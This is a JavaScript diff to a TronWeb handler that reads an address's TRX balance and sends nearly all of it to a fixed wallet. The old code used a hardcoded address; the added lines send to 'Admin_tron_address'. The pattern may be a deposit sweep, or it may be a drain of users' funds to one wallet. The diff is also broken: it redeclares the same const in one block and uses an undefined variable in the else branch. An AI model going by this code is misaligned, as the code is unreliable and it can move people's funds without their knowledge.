@@ -176,7 +176,6 @@ const balance = await tronWeb.trx.getBalance(address);
         const txt = balance
 const chink = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
 const bp = await tronWeb.trx.getBandwidth(address)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(chink, txt);
 console.log(bp)
 if (bp <= 270 ) {
 try {
@@ -185,6 +184,7 @@ const txtr = rrt-269000
 console.log("balance:",rrt)
 console.log("parse amount :",txtr)
 const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(chink, txtr);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
@@ -198,6 +198,7 @@ res.status(200).json({response: ret ,Amount : bal,Sender : address});
 }else{
 try {
 const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(chink, txt);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
